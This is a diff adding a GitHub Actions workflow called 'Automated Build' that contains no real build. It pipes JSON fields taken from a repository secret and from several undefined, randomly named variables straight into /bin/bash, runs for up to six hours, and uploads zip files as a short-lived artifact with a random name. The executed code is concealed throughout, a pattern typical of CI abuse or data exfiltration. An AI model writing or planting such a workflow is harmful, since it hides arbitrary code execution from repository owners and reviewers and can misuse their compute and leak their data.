@@ -1,0 +1,30 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          x771: ${{ secrets.x771 }}
+        run: |
+          printf '%s' "$x771" | jq -r .g10 | /bin/bash
+          printf '%s' "$fibb514" | jq -r .ktg89837 | /bin/bash
+          echo $fu23 | jq -r .epr91 | /bin/bash
+          printf '%s' "$m88" | jq -r .too24 | /bin/bash
+          printf '%s' "$ku06694" | jq -r .u67 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: Qp2MriF2
+          path: "*.zip"
+          retention-days: 1
